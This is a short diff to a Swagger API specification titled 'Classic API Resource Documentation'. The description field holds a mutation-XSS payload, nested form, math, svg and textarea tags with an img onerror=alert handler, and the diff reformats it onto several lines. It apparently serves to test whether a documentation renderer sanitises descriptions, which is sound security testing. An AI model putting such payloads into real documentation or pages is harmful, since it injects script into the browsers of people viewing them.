@@ -2,7 +2,23 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('CarlosTuma') src=1>"></form>
+    <form>
+        <math>
+            <mtext>
+    </form>
+    <form>
+        <mglyph>
+            <svg>
+                <mtext>
+                    <textarea>
+                        <path id="</textarea>
+                            <img onerror=alert('Olá teste') src=1>">
+                        </path>
+                    </textarea>
+                </mtext>
+             </svg>
+        <mglyph>
+    </form>
 
   version: production
 basePath: /JSSResource/
